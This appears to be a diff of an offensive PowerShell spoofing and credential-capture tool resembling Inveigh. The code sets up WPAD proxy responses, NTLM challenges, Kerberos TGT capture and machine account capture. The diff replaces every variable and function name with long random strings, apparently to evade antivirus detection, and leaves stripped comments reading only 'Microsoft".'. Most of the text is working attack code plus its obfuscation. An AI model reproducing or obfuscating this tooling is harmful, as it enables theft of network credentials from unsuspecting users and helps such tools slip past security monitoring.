+    if($MslTACztzyXoaKHvwDiYETatjVpozshBYotjqUR -and !$obcRRswvZXEpdnVKmVqxjHfaEIVMDzeLYwwAE)
     {
-        $LightOval.output_queue.Add("[+] HTTP/HTTPS Directory = $YummyShame")  > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] HTTP/HTTPS Directory = $MslTACztzyXoaKHvwDiYETatjVpozshBYotjqUR")  > $null
 
-        if($StewLean)
+        if($lPdyiYkNubAdzFDDAVCwBwpJsVNHasQHppbgl)
         {
-            $LightOval.output_queue.Add("[+] HTTP/HTTPS Default Response File = $StewLean")  > $null
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] HTTP/HTTPS Default Response File = $lPdyiYkNubAdzFDDAVCwBwpJsVNHasQHppbgl")  > $null
         }
 
-        if($BadgeKind)
+        if($mxyeWmucysuQaCQWfngETzsqqbNiqa)
         {
-            $LightOval.output_queue.Add("[+] HTTP/HTTPS Default Response Executable = $BadgeKind")  > $null
-        }
-
-    }
-
-    if($YawnOdd)
-    {
-        $LightOval.output_queue.Add("[+] HTTP/HTTPS Response = Enabled")  > $null
-    }
-
-    if($YawnOdd -or $YummyShame -and $SwingHorses -ne 'html/text')
-    {
-        $LightOval.output_queue.Add("[+] HTTP/HTTPS/Proxy Content Type = $SwingHorses")  > $null
-    }
-
-    if($SkirtStone -eq 'Basic' -or $LoadTrade -eq 'Basic')
-    {
-        $LightOval.output_queue.Add("[+] Basic Authentication Realm = $SuperbBlood")  > $null
-    }
-
-    if($RecordRobust)
-    {
-
-        foreach($NightHook in $RecordRobust)
-        {
-            $NestCoast += 'if (dnsDomainIs(host, "' + $NightHook + '")) return "DIRECT";'
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] HTTP/HTTPS Default Response Executable = $mxyeWmucysuQaCQWfngETzsqqbNiqa")  > $null
         }
 
     }
 
-    if($JumpyWrench -eq 'Y')
+    if($obcRRswvZXEpdnVKmVqxjHfaEIVMDzeLYwwAE)
+    {
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] HTTP/HTTPS Response = Enabled")  > $null
+    }
+
+    if($obcRRswvZXEpdnVKmVqxjHfaEIVMDzeLYwwAE -or $MslTACztzyXoaKHvwDiYETatjVpozshBYotjqUR -and $GqExLUpPHBnrxIigVOcPUZyEfogVhxNbREMxfzIAcS -ne 'html/text')
+    {
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] HTTP/HTTPS/Proxy Content Type = $GqExLUpPHBnrxIigVOcPUZyEfogVhxNbREMxfzIAcS")  > $null
+    }
+
+    if($SKVFmrXEfBIfxjyvDecjFzVZvkyOhdiApBpgWeXKPiyP -eq 'Basic' -or $QHapxkBOzdGDgKrNpoGOOUOrxeHqddKnclM -eq 'Basic')
+    {
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] Basic Authentication Realm = $KkTbrgewekSBhNviJsMfTclAsOTAazQqLRRlNQY")  > $null
+    }
+
+    if($ADiwJnNZnMBGnMVXtwvUpdIB)
     {
 
-        if($LethalFrog)
+        foreach($qdpEPhfluthJlHqowgPCA in $ADiwJnNZnMBGnMVXtwvUpdIB)
         {
-            $JumpyWrench = "N"
-            $LightOval.output_queue.Add("[-] Proxy Capture Disabled Due To In Use Port $OafishAllow")  > $null
+            $FYxixLRWfCDWnAMKVJRLrzRGoDtWu += 'if (dnsDomainIs(host, "' + $qdpEPhfluthJlHqowgPCA + '")) return "DIRECT";'
+        }
+
+    }
+
+    if($QwSMzXPWnDpEnfpPpksOdTKwwVNMJkIdZB -eq 'Y')
+    {
+
+        if($lSHOxkbfbdxsmvkZUHJXvgEdcOx)
+        {
+            $QwSMzXPWnDpEnfpPpksOdTKwwVNMJkIdZB = "N"
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[-] Proxy Capture Disabled Due To In Use Port $uVKWZlyRdsxhxHZhEhpVHaVYWFrjLZNRwXVHZiokBazh")  > $null
         }
         else
         {
-            $LightOval.output_queue.Add("[+] Proxy Capture = Enabled")  > $null
-            $LightOval.output_queue.Add("[+] Proxy Port = $OafishAllow") > $null
-            $LightOval.output_queue.Add("[+] Proxy Authentication = $LightDesign")  > $null
-            $BadgeMate = $OafishAllow + 1
-            $ExpandNest = ($ExpandNest | Where-Object {$_ -and $_.Trim()})
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] Proxy Capture = Enabled")  > $null
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] Proxy Port = $uVKWZlyRdsxhxHZhEhpVHaVYWFrjLZNRwXVHZiokBazh") > $null
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] Proxy Authentication = $HvUqFOMXgTONLjKfDZYefWFgo")  > $null
+            $lyytmEHBYQYduYraMFBDkpkrHfSszBuQGZPstoV = $uVKWZlyRdsxhxHZhEhpVHaVYWFrjLZNRwXVHZiokBazh + 1
+            $eHhdMzJITQkHvLFvGvuaGszuwtoKkVctXVaSotDPalR = ($eHhdMzJITQkHvLFvGvuaGszuwtoKkVctXVaSotDPalR | Where-Object {$_ -and $_.Trim()})
 
-            if($ExpandNest.Count -gt 0)
+            if($eHhdMzJITQkHvLFvGvuaGszuwtoKkVctXVaSotDPalR.Count -gt 0)
             {
-                $LightOval.output_queue.Add("[+] Proxy Ignore List = " + ($ExpandNest -join ","))  > $null
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] Proxy Ignore List = " + ($eHhdMzJITQkHvLFvGvuaGszuwtoKkVctXVaSotDPalR -join ","))  > $null
             }
 
-            if($PreachBad -eq '0.0.0.0')
+            if($uyfyGXdurVEEVxvRILOlr -eq '0.0.0.0')
             {
-                $RoomLike = $SmashDolls
-            }
-            else
-            {
-                $RoomLike = $PreachBad
-            }
-
-            if($PlayIdea -and $RuralOpen)
-            {
-                $ReasonTrust = "function FindProxyForURL(url,host){$NestCoast return `"PROXY $RoomLike`:$OafishAllow; PROXY $PlayIdea`:$RuralOpen; DIRECT`";}"
+                $EVQJummrBSdulTOZtzwrz = $vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS
             }
             else
             {
-                $ReasonTrust = "function FindProxyForURL(url,host){$NestCoast return `"PROXY $RoomLike`:$OafishAllow; PROXY $RoomLike`:$BadgeMate; DIRECT`";}"
+                $EVQJummrBSdulTOZtzwrz = $uyfyGXdurVEEVxvRILOlr
+            }
+
+            if($voOnItKiZuDTGcbpsxtqAbz -and $IYAYGqRLLvHcDtnlfCDQT)
+            {
+                $aWWNkGgRqzQWHhdZkUzqbTdql = "function FindProxyForURL(url,host){$FYxixLRWfCDWnAMKVJRLrzRGoDtWu return `"PROXY $EVQJummrBSdulTOZtzwrz`:$uVKWZlyRdsxhxHZhEhpVHaVYWFrjLZNRwXVHZiokBazh; PROXY $voOnItKiZuDTGcbpsxtqAbz`:$IYAYGqRLLvHcDtnlfCDQT; DIRECT`";}"
+            }
+            else
+            {
+                $aWWNkGgRqzQWHhdZkUzqbTdql = "function FindProxyForURL(url,host){$FYxixLRWfCDWnAMKVJRLrzRGoDtWu return `"PROXY $EVQJummrBSdulTOZtzwrz`:$uVKWZlyRdsxhxHZhEhpVHaVYWFrjLZNRwXVHZiokBazh; PROXY $EVQJummrBSdulTOZtzwrz`:$lyytmEHBYQYduYraMFBDkpkrHfSszBuQGZPstoV; DIRECT`";}"
             }
 
         }
 
     }
 
-    $LightOval.output_queue.Add("[+] WPAD Authentication = $LoadTrade")  > $null
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] WPAD Authentication = $QHapxkBOzdGDgKrNpoGOOUOrxeHqddKnclM")  > $null
 
-    if($LoadTrade -like "NTLM*")
+    if($QHapxkBOzdGDgKrNpoGOOUOrxeHqddKnclM -like "NTLM*")
     {
-        $RobustFail = ($RobustFail | Where-Object {$_ -and $_.Trim()})
+        $LBwGGAkoRuUTfNJopnGziYvEpsmlXdMTqzqc = ($LBwGGAkoRuUTfNJopnGziYvEpsmlXdMTqzqc | Where-Object {$_ -and $_.Trim()})
 
-        if($RobustFail.Count -gt 0)
+        if($LBwGGAkoRuUTfNJopnGziYvEpsmlXdMTqzqc.Count -gt 0)
         {
-            $LightOval.output_queue.Add("[+] WPAD NTLM Authentication Ignore List = " + ($RobustFail -join ","))  > $null
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] WPAD NTLM Authentication Ignore List = " + ($LBwGGAkoRuUTfNJopnGziYvEpsmlXdMTqzqc -join ","))  > $null
         }
 
     }
 
-    if($RecordRobust)
+    if($ADiwJnNZnMBGnMVXtwvUpdIB)
     {
-        $LightOval.output_queue.Add("[+] WPAD Direct Hosts = " + ($RecordRobust -join ","))  > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] WPAD Direct Hosts = " + ($ADiwJnNZnMBGnMVXtwvUpdIB -join ","))  > $null
     }
 
-    if($ReasonTrust -and $JumpyWrench -eq 'N')
+    if($aWWNkGgRqzQWHhdZkUzqbTdql -and $QwSMzXPWnDpEnfpPpksOdTKwwVNMJkIdZB -eq 'N')
     {
-        $LightOval.output_queue.Add("[+] WPAD Response = Enabled")  > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] WPAD Response = Enabled")  > $null
     }
-    elseif($ReasonTrust -and $JumpyWrench -eq 'Y')
+    elseif($aWWNkGgRqzQWHhdZkUzqbTdql -and $QwSMzXPWnDpEnfpPpksOdTKwwVNMJkIdZB -eq 'Y')
     {
-        $LightOval.output_queue.Add("[+] WPAD Proxy Response = Enabled")  > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] WPAD Proxy Response = Enabled")  > $null
 
-        if($PlayIdea -and $RuralOpen)
+        if($voOnItKiZuDTGcbpsxtqAbz -and $IYAYGqRLLvHcDtnlfCDQT)
         {
-            $LightOval.output_queue.Add("[+] WPAD Failover = $PlayIdea`:$RuralOpen")  > $null
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] WPAD Failover = $voOnItKiZuDTGcbpsxtqAbz`:$IYAYGqRLLvHcDtnlfCDQT")  > $null
         }
 
     }
-    elseif($PlayIdea -and $RuralOpen)
+    elseif($voOnItKiZuDTGcbpsxtqAbz -and $IYAYGqRLLvHcDtnlfCDQT)
     {
-        $LightOval.output_queue.Add("[+] WPAD Response = Enabled")  > $null
-        $LightOval.output_queue.Add("[+] WPAD = $PlayIdea`:$RuralOpen")  > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] WPAD Response = Enabled")  > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] WPAD = $voOnItKiZuDTGcbpsxtqAbz`:$IYAYGqRLLvHcDtnlfCDQT")  > $null
         
-        if($RecordRobust)
+        if($ADiwJnNZnMBGnMVXtwvUpdIB)
         {
 
-            foreach($NightHook in $RecordRobust)
+            foreach($qdpEPhfluthJlHqowgPCA in $ADiwJnNZnMBGnMVXtwvUpdIB)
             {
-                $NestCoast += 'if (dnsDomainIs(host, "' + $NightHook + '")) return "DIRECT";'
+                $FYxixLRWfCDWnAMKVJRLrzRGoDtWu += 'if (dnsDomainIs(host, "' + $qdpEPhfluthJlHqowgPCA + '")) return "DIRECT";'
             }
 
-            $ReasonTrust = "function FindProxyForURL(url,host){" + $NestCoast + "return `"PROXY " + $PlayIdea + ":" + $RuralOpen + "`";}"
-            $LightOval.output_queue.Add("[+] WPAD Direct Hosts = " + ($RecordRobust -join ","))  > $null
+            $aWWNkGgRqzQWHhdZkUzqbTdql = "function FindProxyForURL(url,host){" + $FYxixLRWfCDWnAMKVJRLrzRGoDtWu + "return `"PROXY " + $voOnItKiZuDTGcbpsxtqAbz + ":" + $IYAYGqRLLvHcDtnlfCDQT + "`";}"
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] WPAD Direct Hosts = " + ($ADiwJnNZnMBGnMVXtwvUpdIB -join ","))  > $null
         }
         else
         {
-            $ReasonTrust = "function FindProxyForURL(url,host){$NestCoast return `"PROXY $PlayIdea`:$RuralOpen; DIRECT`";}"
+            $aWWNkGgRqzQWHhdZkUzqbTdql = "function FindProxyForURL(url,host){$FYxixLRWfCDWnAMKVJRLrzRGoDtWu return `"PROXY $voOnItKiZuDTGcbpsxtqAbz`:$IYAYGqRLLvHcDtnlfCDQT; DIRECT`";}"
         }
 
     }
 
-    if($HeavySmall)
+    if($xUlvMGNvOmaODuSVmfwndiKyNJVQvZCjtHWjFUWcWmBU)
     {
-        $LightOval.output_queue.Add("[+] HTTP NTLM Challenge = $HeavySmall")  > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] HTTP NTLM Challenge = $xUlvMGNvOmaODuSVmfwndiKyNJVQvZCjtHWjFUWcWmBU")  > $null
     }
 
 }
 
-if($HeapDetect -eq 'Y')
+if($fanhQcOeQBmoBotjLVUmvltLESsAfwuewvn -eq 'Y')
 {
-    $LightOval.output_queue.Add("[+] Kerberos TGT Capture = Enabled")  > $null
-    $LightOval.output_queue.Add("[+] Kerberos TGT File Output Count = $KindLick")  > $null
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] Kerberos TGT Capture = Enabled")  > $null
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] Kerberos TGT File Output Count = $JoXWcoXEYHNGuWREHpaUFbcXY")  > $null
     
-    if($OrangeDog.Count -gt 0)
+    if($jSRJtPliVOZcEheIvIfSdzZkyexraLCnkoMNKC.Count -gt 0)
     {
-        $LightOval.output_queue.Add("[+] Kerberos TGT Host Header List = " + ($OrangeDog -join ","))  > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] Kerberos TGT Host Header List = " + ($jSRJtPliVOZcEheIvIfSdzZkyexraLCnkoMNKC -join ","))  > $null
     }
 
 }
 else
 {
-    $LightOval.output_queue.Add("[+] Kerberos TGT Capture = Disabled")  > $null    
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] Kerberos TGT Capture = Disabled")  > $null    
 }
 
-if($ShinyUppity -eq 'N')
+if($mwNkwDoBRXQQARPqtqrnqckGKqSYpseblGNrGPTZyPo -eq 'N')
 {
-    $LightOval.output_queue.Add("[+] Machine Account Capture = Disabled")  > $null
-    $LightOval.machine_accounts = $false
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] Machine Account Capture = Disabled")  > $null
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.machine_accounts = $false
 }
 else
 {
-    $LightOval.output_queue.Add("[+] Machine Account Capture = Enabled")  > $null
-    $LightOval.machine_accounts = $true
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] Machine Account Capture = Enabled")  > $null
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.machine_accounts = $true
 }
 
-if($RottenBed -ne 'N')
+if($lkPcWVVpLUCgsOzshxhpoRVCsIGIIciiEFTOCbSPYBG -ne 'N')
 {
 
-    if($RottenBed -ne 'N')
+    if($lkPcWVVpLUCgsOzshxhpoRVCsIGIIciiEFTOCbSPYBG -ne 'N')
     {
 
-        if($RottenBed -eq 'Y')
+        if($lkPcWVVpLUCgsOzshxhpoRVCsIGIIciiEFTOCbSPYBG -eq 'Y')
         {
-            $LightOval.output_queue.Add("[+] Console Output = Full")  > $null
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] Console Output = Full")  > $null
         }
         else
         {
-            $LightOval.output_queue.Add("[+] Console Output = $RottenBed")  > $null
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] Console Output = $lkPcWVVpLUCgsOzshxhpoRVCsIGIIciiEFTOCbSPYBG")  > $null
         }
 
     }
 
-    $LightOval.console_output = $true
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_output = $true
 
-    if($CycleLovely -eq 1)
+    if($WTwPWDshnKDcBRTCcwgFtZhPkAvsjVqmrtn -eq 1)
     {
-        $LightOval.output_queue.Add("[+] Console Status = $CycleLovely Minute")  > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] Console Status = $WTwPWDshnKDcBRTCcwgFtZhPkAvsjVqmrtn Minute")  > $null
     }
-    elseif($CycleLovely -gt 1)
+    elseif($WTwPWDshnKDcBRTCcwgFtZhPkAvsjVqmrtn -gt 1)
     {
-        $LightOval.output_queue.Add("[+] Console Status = $CycleLovely Minutes")  > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] Console Status = $WTwPWDshnKDcBRTCcwgFtZhPkAvsjVqmrtn Minutes")  > $null
     }
 
 }
 else
 {
 
-    if($LightOval.tool -eq 1)
+    if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.tool -eq 1)
     {
-        $LightOval.output_queue.Add("[+] Console Output Disabled Due To External Tool Selection")  > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] Console Output Disabled Due To External Tool Selection")  > $null
     }
     else
     {
-        $LightOval.output_queue.Add("[+] Console Output = Disabled")  > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] Console Output = Disabled")  > $null
     }
 
 }
 
-if($EscapeArch -eq 'Y')
+if($ZUaLdqsdrhxWmJEfQKCHDLyHiaEIyXowcmqOUahE -eq 'Y')
 {
-    $LightOval.console_unique = $true
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_unique = $true
 }
 else
 {
-    $LightOval.console_unique = $false
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_unique = $false
 }
 
-if($FileOutput -eq 'Y' -or ($HeapDetect -eq 'Y' -and $KindLick -gt 0) -or ($SlimyCable -eq 'File' -and ($BreezyDesign -or $FairAblaze)))
+if($FileOutput -eq 'Y' -or ($fanhQcOeQBmoBotjLVUmvltLESsAfwuewvn -eq 'Y' -and $JoXWcoXEYHNGuWREHpaUFbcXY -gt 0) -or ($QXplYkjxeRFAgTbHwoZGdRyj -eq 'File' -and ($xiTnjmjZESCjsSHBdSaGp -or $NJquQJdotFLnYRzmvZcDDMgYuxhLWvmllbBNpsWFnKORo)))
 {
     
     if($FileOutput -eq 'Y')
     {
-        $LightOval.output_queue.Add("[+] File Output = Enabled")  > $null
-        $LightOval.file_output = $true
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] File Output = Enabled")  > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.file_output = $true
     }
 
-    if($SlimyCable -eq 'File')
+    if($QXplYkjxeRFAgTbHwoZGdRyj -eq 'File')
     {
-        $LightOval.output_queue.Add("[+] Pcap Output = File") > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] Pcap Output = File") > $null
         
-        if($BreezyDesign)
+        if($xiTnjmjZESCjsSHBdSaGp)
         {
-            $LightOval.output_queue.Add("[+] Pcap TCP Ports = " + ($BreezyDesign -join ","))  > $null
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] Pcap TCP Ports = " + ($xiTnjmjZESCjsSHBdSaGp -join ","))  > $null
         }
 
-        if($FairAblaze)
+        if($NJquQJdotFLnYRzmvZcDDMgYuxhLWvmllbBNpsWFnKORo)
         {
-            $LightOval.output_queue.Add("[+] Pcap UDP Ports = " + ($FairAblaze -join ","))  > $null
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] Pcap UDP Ports = " + ($NJquQJdotFLnYRzmvZcDDMgYuxhLWvmllbBNpsWFnKORo -join ","))  > $null
         }
 
     }
 
-    $LightOval.output_queue.Add("[+] Output Directory = $SilkySmelly")  > $null 
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] Output Directory = $NEfQfhYIiNOOsRWGcSaBKnaQpZTkphwGrbcV")  > $null 
 }
 else
 {
-    $LightOval.output_queue.Add("[+] File Output = Disabled")  > $null
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] File Output = Disabled")  > $null
 }
 
-if($SlimyCable -eq 'Memory')
+if($QXplYkjxeRFAgTbHwoZGdRyj -eq 'Memory')
 {
-    $LightOval.output_queue.Add("[+] Pcap Output = Memory")
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] Pcap Output = Memory")
 }
 
 if($FileUnique -eq 'Y')
 {
-    $LightOval.file_unique = $true
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.file_unique = $true
 }
 else
 {
-    $LightOval.file_unique = $false
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.file_unique = $false
 }
 
-if($WhiteNote -eq 'Y')
+if($jjFnwMjlUxGLCApPYzLoDktsIGYjfDUqWDUXDZ -eq 'Y')
 {
-    $LightOval.log_output = $true
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.log_output = $true
 }
 else
 {
-    $LightOval.log_output = $false
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.log_output = $false
 }
 
-if($MatterOffice)
+if($KndapymywThkYKAxqdcJDIReOUkholHuQAHkNlCjcX)
 {
-    $LightOval.output_queue.Add("[+] Run Count = $MatterOffice") > $null
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] Run Count = $KndapymywThkYKAxqdcJDIReOUkholHuQAHkNlCjcX") > $null
 }
 
-if($GrowthWind -eq 1)
+if($PHCBkumExoZsaamTxeZRDLT -eq 1)
 {
-    $LightOval.output_queue.Add("[+] Run Time = $GrowthWind Minute")  > $null
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] Run Time = $PHCBkumExoZsaamTxeZRDLT Minute")  > $null
 }
-elseif($GrowthWind -gt 1)
+elseif($PHCBkumExoZsaamTxeZRDLT -gt 1)
 {
-    $LightOval.output_queue.Add("[+] Run Time = $GrowthWind Minutes")  > $null
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] Run Time = $PHCBkumExoZsaamTxeZRDLT Minutes")  > $null
 }
 
-if($DollHead -eq 'Y')
+if($qbmBmJvYTsbYUvEKbqNCbOv -eq 'Y')
 {
-    $LightOval.output_queue.Add("[!] Run Stop-LightOval to stop")  > $null
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[!] Run Stop-sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV to stop")  > $null
 
-    if($LightOval.console_output)
+    if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_output)
     {
-        $LightOval.output_queue.Add("[*] Press any key to stop console output")  > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[*] Press any key to stop console output")  > $null
     }
 
 }
 
-while($LightOval.output_queue.Count -gt 0)
+while($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Count -gt 0)
 {
 
-    switch -Wildcard ($LightOval.output_queue[0])
+    switch -Wildcard ($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue[0])
     {
 
         {$_ -like "?`[`!`]*" -or $_ -like "?`[-`]*"}
         {
 
-            if($LightOval.status_output -and $LightOval.output_stream_only)
+            if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.status_output -and $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_stream_only)
             {
-                Write-TableSteam($LightOval.output_queue[0] + $LightOval.newline)
+                Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue[0] + $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.newline)
             }
-            elseif($LightOval.status_output)
+            elseif($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.status_output)
             {
-                Write-Warning($LightOval.output_queue[0])
-            }
-
-            if($LightOval.file_output)
-            {
-                $LightOval.log_file_queue.Add($LightOval.output_queue[0]) > $null
+                Write-Warning($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue[0])
             }
 
-            if($LightOval.log_output)
+            if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.file_output)
             {
-                $LightOval.log.Add($LightOval.output_queue[0]) > $null
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.log_file_queue.Add($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue[0]) > $null
             }
 
-            $LightOval.output_queue.RemoveAt(0)
+            if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.log_output)
+            {
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.log.Add($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue[0]) > $null
+            }
+
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.RemoveAt(0)
         }
 
         default
         {
 
-            if($LightOval.status_output -and $LightOval.output_stream_only)
+            if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.status_output -and $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_stream_only)
             {
-                Write-TableSteam($LightOval.output_queue[0] + $LightOval.newline)
+                Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue[0] + $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.newline)
             }
-            elseif($LightOval.status_output)
+            elseif($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.status_output)
             {
-                Write-TableSteam($LightOval.output_queue[0])
+                Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue[0])
             }
 
-            if($LightOval.file_output)
+            if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.file_output)
             {
 
-                if ($LightOval.output_queue[0].StartsWith("[+] ") -or $LightOval.output_queue[0].StartsWith("[*] "))
+                if ($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue[0].StartsWith("[+] ") -or $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue[0].StartsWith("[*] "))
                 {
-                    $LightOval.log_file_queue.Add($LightOval.output_queue[0]) > $null
+                    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.log_file_queue.Add($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue[0]) > $null
                 }
                 else
                 {
-                    $LightOval.log_file_queue.Add("[redacted]") > $null    
+                    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.log_file_queue.Add("[redacted]") > $null    
                 }
 
             }
 
-            if($LightOval.log_output)
+            if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.log_output)
             {
-                $LightOval.log.Add($LightOval.output_queue[0]) > $null
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.log.Add($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue[0]) > $null
             }
 
-            $LightOval.output_queue.RemoveAt(0)
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.RemoveAt(0)
         }
 
     }
 
 }
 
-$LightOval.status_output = $false
+$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.status_output = $false
 
 # Microsoft".
 # Microsoft".
 
 # Microsoft".
-$LivelySqueak =
+$bfhGGCJCKYcIazbgbfVjAZtmjUAKMEb =
 {
 
     function Get-UInt16DataLength
     {
-        param ([Int]$InjureNoise,[Byte[]]$IckyBloody)
-        $UnableActor = [System.BitConverter]::ToUInt16($IckyBloody[$InjureNoise..($InjureNoise + 1)],0)
+        param ([Int]$XYwsDOntqdVFqECyaPTUoiVMbxehIYAvG,[Byte[]]$eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE)
+        $XbYrPODIGzmpSMdbiHUuuQjAVHjfLCwfJbYLhZeDiOF = [System.BitConverter]::ToUInt16($eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE[$XYwsDOntqdVFqECyaPTUoiVMbxehIYAvG..($XYwsDOntqdVFqECyaPTUoiVMbxehIYAvG + 1)],0)
 
-        return $UnableActor
+        return $XbYrPODIGzmpSMdbiHUuuQjAVHjfLCwfJbYLhZeDiOF
     }
 
     function Get-UInt32DataLength
     {
-        param ([Int]$InjureNoise,[Byte[]]$IckyBloody)
+        param ([Int]$XYwsDOntqdVFqECyaPTUoiVMbxehIYAvG,[Byte[]]$eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE)
 
-        $UnableActor = [System.BitConverter]::ToUInt32($IckyBloody[$InjureNoise..($InjureNoise + 3)],0)
